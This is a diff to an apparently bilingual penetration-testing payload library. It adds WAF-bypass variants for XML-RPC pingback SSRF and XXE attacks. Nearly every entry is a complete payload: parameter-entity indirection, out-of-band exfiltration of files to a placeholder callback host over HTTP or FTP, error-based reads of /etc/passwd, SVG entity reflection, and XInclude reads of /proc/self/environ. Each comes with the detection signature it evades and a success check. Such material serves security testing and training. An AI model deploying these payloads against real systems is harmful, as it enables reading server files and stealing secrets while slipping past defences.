+          "command": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<methodCall><methodName>pingback.ping</methodName>\n<params><param><value><string><![CDATA[http://127.0.0.1:8080/]]></string></value></param></params>\n</methodCall>",
+          "description": {
+            "zh": "绕过对参数节点内 http:// 明文的扫描：目标 URL 放入 CDATA 节点，解析后语义不变；回调到达内网目标即成功。",
+            "en": "Place the target URL inside a CDATA node so plaintext scanning misses it while parsing preserves it; a callback reaching the internal target confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 参数编码",
+            "en": "Base64 Parameter Encoding"
+          },
+          "command": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<methodCall><methodName>pingback.ping</methodName>\n<params><param><value><base64>aHR0cDovLzEyNy4wLjAuMTo4MDgwLw==</base64></value></param></params>\n</methodCall>",
+          "description": {
+            "zh": "绕过对 URL 字符串类型的检测：参数改用 base64 类型节点传输，XML-RPC 解码后仍为目标地址；内网请求发出即成功。",
+            "en": "Send the parameter as a base64-typed value so URL string detection misses it while XML-RPC decodes it; an issued internal request confirms success."
+          }
         }
       ]
     },
@@ -2405,8 +2974,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "参数实体",
-        "en": "Parameter Entities"
+        "zh": "盲注与带外外带",
+        "en": "Blind & Out-of-Band Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2509,6 +3078,41 @@
           "zh": "删除 XML/DTD/marker 和解析产物，清理 parser/应用缓存与错误日志，恢复禁用 DTD/外部实体配置并重启 worker。",
           "en": "Delete XML, DTD, markers, and parse artifacts, clear parser and application caches plus error logs, restore disabled DTD and external-entity settings, and restart workers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "双层参数实体间接变体",
+            "en": "Two-Layer Parameter Indirection"
+          },
+          "command": "<!ENTITY % raw SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % wrap \"<!ENTITY test '&#37;raw;'>\"> %wrap;\n<data>&test;</data>",
+          "description": {
+            "zh": "先经参数实体包装再落地为通用实体，规避 %xxe; 直引特征；成功判据：data 节点输出文件内容。",
+            "en": "Wraps through a parameter entity before materializing a general entity, evading direct %xxe; references. Success: the data node outputs file contents."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体名变形变体",
+            "en": "Entity-Name Mutation Variant"
+          },
+          "command": "<!ENTITY % f SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY o \"%f;\">\n<item>&o;</item>",
+          "description": {
+            "zh": "参数实体名换短名 f、通用实体换 o，绕过固定 xxe 命名特征；成功判据：item 内容回显文件。",
+            "en": "Renames parameter entity to f and general entity to o to evade the fixed xxe naming pattern. Success: item echoes the file."
+          }
+        },
+        {
+          "title": {
+            "zh": "外部 DTD 托管变体",
+            "en": "External DTD Hosting Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><!DOCTYPE data SYSTEM \"http://{LAB_OAST}/param.dtd\"><data>&leak;</data>\n# param.dtd: <!ENTITY % f SYSTEM \"file://{FILE_PATH}\"><!ENTITY leak \"%f;\">",
+          "description": {
+            "zh": "参数实体逻辑整体移到外部 DTD，本地只留一个 SYSTEM 引用；成功判据：data 回显文件内容。",
+            "en": "Moves the parameter-entity logic entirely into an external DTD leaving one SYSTEM reference locally. Success: data echoes file contents."
+          }
+        }
       ]
     },
     {
@@ -2526,8 +3130,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "Blind XXE 外带样例",
-        "en": "Blind XXE Exfiltration Sample"
+        "zh": "盲注与带外外带",
+        "en": "Blind & Out-of-Band Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2630,6 +3234,41 @@
           "zh": "关闭 DTD/DNS/HTTP 端点，删除 token/XML/DTD 和回调日志，清理解析队列与缓存，恢复出站和实体解析限制。",
           "en": "Close DTD, DNS, and HTTP endpoints, delete tokens, XML, DTDs, and callback logs, clear parser queues and caches, and restore egress and entity-resolution restrictions."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "FTP 通道外带变体",
+            "en": "FTP Channel Exfil Variant"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % file SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/x.dtd\"> %dtd;\n]>\n<foo/>\n# x.dtd: <!ENTITY % all \"<!ENTITY&#37; send SYSTEM 'ftp://{LAB_OAST}/?f=%file;'>\"> %all;",
+          "description": {
+            "zh": "绕过仅监控 HTTP 出网的检测：数据经 FTP 控制通道外带；成功判据：FTP 服务端收到含文件内容的用户名参数。",
+            "en": "Bypasses HTTP-only egress monitoring by exfiltrating over the FTP control channel. Success: the FTP server receives the file contents as username parameters."
+          }
+        },
+        {
+          "title": {
+            "zh": "参数实体双层间接变体",
+            "en": "Two-Layer Parameter Indirection"
+          },
+          "command": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ENTITY % mid SYSTEM \"http://{LAB_OAST}/mid.dtd\">\n%mid;\n]>\n<foo/>\n# mid.dtd: <!ENTITY % file SYSTEM \"file://{FILE_PATH}\"><!ENTITY % c \"<!ENTITY &#37; s SYSTEM 'http://{LAB_OAST}/?d=%file;'>\"> %c;",
+          "description": {
+            "zh": "本地 DOCTYPE 只含一次外链，文件读取与回传全部移到外部 DTD，规避 %file; 本地特征；成功判据：OAST 请求参数含文件内容。",
+            "en": "Keeps only one outbound reference locally and moves file read plus send into the external DTD, evading local %file; signatures. Success: OAST request parameters contain file contents."
+          }
+        },
+        {
+          "title": {
+            "zh": "十六进制实体百分号变体",
+            "en": "Hex-Entity Percent Variant"
+          },
+          "command": "<!ENTITY % file SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % eval \"<!ENTITY &#x25; send SYSTEM 'http://{LAB_OAST}/?d=%file;'>\"> %eval; %send;",
+          "description": {
+            "zh": "内层 % 用 &#x25; 编码替代 &#x25; 数值形式之外的写法差异，绕过对 &#37;/&#x25; 固定转义的规则；成功判据：外带请求到达。",
+            "en": "Encodes the inner % as &#x25; to vary from the usual &#37; form and evade rules keyed on that fixed escape. Success: the exfil request arrives."
+          }
+        }
       ]
     },
     {
@@ -2647,8 +3286,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "编码与外部 DTD",
-        "en": "Encoding and External DTD"
+        "zh": "盲注与带外外带",
+        "en": "Blind & Out-of-Band Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2751,6 +3390,41 @@
           "zh": "删除 XML、外部 DTD、marker 与编码产物，关闭 resolver 端点，清理 parser 缓存/错误日志并恢复 scheme/实体限制。",
           "en": "Delete XML, external DTDs, markers, and encoded artifacts, close resolver endpoints, clear parser caches and error logs, and restore scheme and entity restrictions."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "iconv 前置编码变体",
+            "en": "iconv Pre-encoding Variant"
+          },
+          "command": "<!ENTITY % file SYSTEM \"php://filter/read=convert.iconv.UTF8.UTF16|convert.base64-encode/resource={FILE_PATH}\">\n<!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/c.dtd\"> %dtd;",
+          "description": {
+            "zh": "filter 链加 iconv 环节再 base64，规避 convert.base64-encode/resource 直连特征；成功判据：外带数据可双重还原。",
+            "en": "Adds an iconv stage before base64 to evade the direct convert.base64-encode/resource signature. Success: exfil data survives double restoration."
+          }
+        },
+        {
+          "title": {
+            "zh": "CDATA 转义写法变体",
+            "en": "CDATA Escape Notation Variant"
+          },
+          "command": "<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource={FILE_PATH}\">\n<!ENTITY % all \"<!&#91;CDATA&#91;<!ENTITY send 'http://{LAB_OAST}/?d=%file;'>&#93;&#93;>\">",
+          "description": {
+            "zh": "CDATA 括号以字符实体书写，规避对 <![CDATA[ 明文的检测；成功判据：解析后 send 实体被构造并请求 OAST。",
+            "en": "Writes CDATA brackets as character references to evade detection of the literal <![CDATA[. Success: the send entity is constructed and OAST is requested."
+          }
+        },
+        {
+          "title": {
+            "zh": "换行拆分声明变体",
+            "en": "Newline-Split Declaration Variant"
+          },
+          "command": "<!ENTITY % file\nSYSTEM\n\"php://filter/convert.base64-encode/resource={FILE_PATH}\">\n<!ENTITY % dtd\nSYSTEM \"http://{LAB_OAST}/c2.dtd\"> %dtd;",
+          "description": {
+            "zh": "声明关键 token 间插入换行，打断一行式 SYSTEM \"php://filter 匹配；成功判据：外部 DTD 拉取成功。",
+            "en": "Splits declaration tokens across newlines to break one-line SYSTEM \"php://filter matching. Success: the external DTD is fetched."
+          }
+        }
       ]
     },
     {
@@ -2768,8 +3442,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "错误回显",
-        "en": "Error-Based Reflection"
+        "zh": "盲注与带外外带",
+        "en": "Blind & Out-of-Band Exfiltration"
       },
       "tutorial": {
         "overview": {
@@ -2872,6 +3546,41 @@
           "zh": "关闭 DTD endpoint，删除 XML/token/marker 和错误日志副本，清理告警/重试队列，恢复统一错误处理与实体限制。",
           "en": "Close the DTD endpoint, delete XML, tokens, markers, and error-log copies, clear alert and retry queues, and restore uniform error handling and entity restrictions."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "嵌套报错读取变体",
+            "en": "Nested Error-Read Variant"
+          },
+          "command": "<!ENTITY % file SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'file:///nonexist/%file;'>\"> %eval; %err;",
+          "description": {
+            "zh": "文件内容拼进不存在路径的报错消息回显，规避 OAST 出网被墙的场景；成功判据：错误页包含文件内容。",
+            "en": "Reflects file contents via the error message for a nonexistent path, useful when egress is blocked. Success: the error page contains file contents."
+          }
+        },
+        {
+          "title": {
+            "zh": "XML 语法错误通道变体",
+            "en": "XML Syntax Error Channel Variant"
+          },
+          "command": "<!ENTITY % file SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % eval \"<!ENTITY &#x25; x '<x>%file;</x>'>\"> %eval;",
+          "description": {
+            "zh": "把文件内容嵌入注定非法的 XML 片段，借解析器语法错误回显数据；成功判据：报错消息中出现数据。",
+            "en": "Embeds file contents into a deliberately invalid XML fragment so the parser's syntax error leaks them. Success: data appears in the error message."
+          }
+        },
+        {
+          "title": {
+            "zh": "双重报错放大变体",
+            "en": "Double Error Amplification Variant"
+          },
+          "command": "<!ENTITY % dtd SYSTEM \"http://{LAB_OAST}/e.dtd\"> %dtd;\n# e.dtd: <!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % i \"<!ENTITY &#37; err SYSTEM 'file:///x/%file;/y'>\"> %i;",
+          "description": {
+            "zh": "本地无文件路径特征、报错链在外部 DTD 完成，规避对 file:///etc 的本地拦截；成功判据：错误响应含 passwd 内容。",
+            "en": "Keeps file paths out of the local payload by completing the error chain in the external DTD. Success: the error response contains passwd contents."
+          }
+        }
       ]
     },
     {
@@ -2889,8 +3598,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "SVG 文本节点回显",
-        "en": "SVG Text-Node Reflection"
+        "zh": "文件读取与编码",
+        "en": "File Read & Encoding"
       },
       "tutorial": {
         "overview": {
@@ -2993,6 +3702,41 @@
           "zh": "删除 SVG、marker、解析树/预览/OCR 产物，清理图像任务队列和缓存，重启隔离 parser/rasterizer。",
           "en": "Delete SVGs, markers, parse trees, previews, and OCR artifacts, clear image job queues and caches, and restart isolated parsers or rasterizers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "多 text 分散回显变体",
+            "en": "Multi-text Scattered Echo Variant"
+          },
+          "command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY h SYSTEM \"file:///etc/hostname\"><!ENTITY n SYSTEM \"file:///proc/sys/kernel/ostype\">]><svg width=\"128px\"><text x=\"0\" y=\"10\">&h;</text><text x=\"0\" y=\"30\">&n;</text></svg>",
+          "description": {
+            "zh": "两个实体分散到多个 text 节点回显，规避单 text 单实体特征；成功判据：渲染文本含主机名与系统类型。",
+            "en": "Scatters two entities across multiple text nodes to evade the single-text single-entity signature. Success: rendered text shows hostname and OS type."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体换行混淆变体",
+            "en": "Entity Newline Confusion Variant"
+          },
+          "command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [\n  <!ENTITY xxe\n    SYSTEM\n    \"file:///etc/hostname\">\n]><svg><text x=\"0\" y=\"16\">&xxe;</text></svg>",
+          "description": {
+            "zh": "声明内部插入换行与缩进，打断 SYSTEM \"file 一行式匹配；成功判据：SVG 文本仍展开实体。",
+            "en": "Inserts newlines and indentation inside the declaration to break one-line SYSTEM \"file matching. Success: the SVG still expands the entity."
+          }
+        },
+        {
+          "title": {
+            "zh": "use 引用复用变体",
+            "en": "use Reference Reuse Variant"
+          },
+          "command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns:xlink=\"http://www.w3.org/1999/xlink\"><text id=\"a\" x=\"0\" y=\"16\">&xxe;</text><use xlink:href=\"#a\" y=\"20\"/></svg>",
+          "description": {
+            "zh": "回显经 use 元素复用，规避直接 text 引用检测；成功判据：两处文本均含主机名。",
+            "en": "Reuses the echo via a use element to evade direct text-reference detection. Success: both text positions show the hostname."
+          }
+        }
       ]
     },
     {
@@ -3010,8 +3754,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "XInclude",
-        "en": "XInclude"
+        "zh": "XInclude 包含",
+        "en": "XInclude Inclusion"
       },
       "tutorial": {
         "overview": {
@@ -3113,6 +3857,41 @@
         {
           "zh": "删除 XML/marker 和包含后产物，清理 resolver/parser 缓存与日志，恢复 XInclude 禁用或 href allowlist 后回归。",
           "en": "Delete XML, markers, and post-inclusion artifacts, clear resolver and parser caches and logs, restore disabled XInclude or href allowlists, and regress."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "href 编码变体",
+            "en": "href Encoded Variant"
+          },
+          "command": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"text\" href=\"&#102;ile://{FILE_PATH}\"/>\n</foo>",
+          "description": {
+            "zh": "协议首字符 f 以字符实体编码，规避 href=\"file:// 明文特征；成功判据：包含内容仍被读取。",
+            "en": "Encodes the leading f as a character reference to hide the href=\"file:// literal. Success: the included content is still read."
+          }
+        },
+        {
+          "title": {
+            "zh": "嵌套 XPointer 变体",
+            "en": "Nested XPointer Variant"
+          },
+          "command": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n<xi:include parse=\"xml\" href=\"file:///etc/passwd\" xpointer=\"xpointer(/)\"/>\n</foo>",
+          "description": {
+            "zh": "改用 parse=\"xml\" + xpointer 全选，规避 parse=\"text\" 特征同时验证结构化包含；成功判据：passwd 节点内容输出。",
+            "en": "Uses parse=\"xml\" with a select-all xpointer to evade parse=\"text\" signatures and verify structured inclusion. Success: passwd node contents output."
+          }
+        },
+        {
+          "title": {
+            "zh": "raw 编码属性变体",
+            "en": "raw Encoding Attribute Variant"
+          },
+          "command": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\" encoding=\"utf-8\">\n<xi:include parse=\"text\" encoding=\"utf-8\" href=\"file:///proc/self/environ\"/>\n</foo>",
+          "description": {
+            "zh": "补全 encoding 属性并换读 /proc/self/environ，规避 passwd 路径专项规则；成功判据：环境变量回显。",
+            "en": "Adds encoding attributes and reads /proc/self/environ to evade passwd-specific rules. Success: environment variables echoed."
+          }
         }
       ]
     },
